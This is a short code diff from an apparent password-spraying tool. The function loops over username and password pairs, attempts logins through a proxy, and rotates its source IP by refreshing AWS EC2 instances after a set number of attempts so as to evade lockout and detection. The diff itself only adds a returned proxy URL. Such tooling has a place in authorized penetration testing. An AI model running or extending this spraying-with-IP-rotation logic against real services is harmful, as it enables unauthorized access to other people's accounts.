@@ -331,13 +331,13 @@ def perform_spray(spray_config, credentials, proxy, queue):
     results = []
     spray_num_with_current_ip = 0
     if proxy['type'] == 'AWS':
-        proxy['ip'] = aws.start_ec2_instance(ec2, proxy['id'])
+        proxy['ip'], proxy['url'] = aws.start_ec2_instance(ec2, proxy['id'])
 
     for credential in credentials:
         spray_config.username = credential['USERNAME']
         spray_config.password = credential['PASSWORD']
         if spray_num_with_current_ip >= spray_config.num_sprays_per_ip and proxy['type'] == 'AWS':
-            proxy['ip'] = aws.refresh_instance_ip(ec2, proxy['id'])
+            proxy['ip'], proxy['url'] = aws.refresh_instance_ip(ec2, proxy['id'])
             spray_num_with_current_ip = 0
         result = attempt_login(spray_config, proxy['url'])
         results.append(result)
